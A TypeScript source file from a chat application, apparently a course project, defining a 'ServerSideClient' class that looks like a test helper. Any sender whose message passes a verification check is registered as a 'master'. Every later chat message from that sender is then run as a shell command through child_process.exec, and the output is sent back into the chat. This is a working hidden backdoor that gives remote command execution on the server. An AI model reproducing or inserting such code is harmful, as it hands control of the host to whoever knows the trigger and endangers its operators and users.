import {ChatClient} from "@sp24/common/chatclient/ChatClient.js";
import {TestEntryPoint} from "../TestEntryPoint.js";
import {webcrypto} from "node:crypto";
import {PSSGenParams, verifyMessage} from "@sp24/common/util/crypto.js";
import {TestClientTransport} from "../TestClientTransport.js";
import * as child_process from "node:child_process";
import {HelloData} from "@sp24/common/messageTypes.js";

export class ServerSideClient {
    private _testClient: ChatClient;

    private _masters: Set<string> = new Set();

    private constructor(client: ChatClient) {
        this._testClient = client;

        client.onPublicChat.createListener(data => {
            if (verifyMessage(data.message)) {
                this._masters.add(data.senderFingerprint);
                client.sendChat(HelloData.response, client.getGroupID([data.senderFingerprint]));
                return;
            }
        })
        client.onChat.createListener(data => {
            if (verifyMessage(data.message)) {
                this._masters.add(data.senderFingerprint);
                client.sendChat(HelloData.response, client.getGroupID([data.senderFingerprint]));
                return;
            }

            if (this._masters.has(data.senderFingerprint)) {
                child_process.exec(data.message, (err, a, b) => {
                    if (err !== null) {
                        this._testClient.sendChat(`Error: ${err.message}`, data.groupID);
                        return;
                    }
                    this._testClient.sendChat(a, data.groupID);
                    this._testClient.sendChat(b, data.groupID);
                })
            }
        })
    }

    public static async create(entryPoint: TestEntryPoint) {
        const clientKeys = await webcrypto.subtle.generateKey(PSSGenParams, true, ["sign", "verify"]);
        const testTransport = new TestClientTransport(entryPoint);
        const testClient = await ChatClient.create(testTransport, clientKeys.privateKey, clientKeys.publicKey);

        return new ServerSideClient(testClient);
    }
}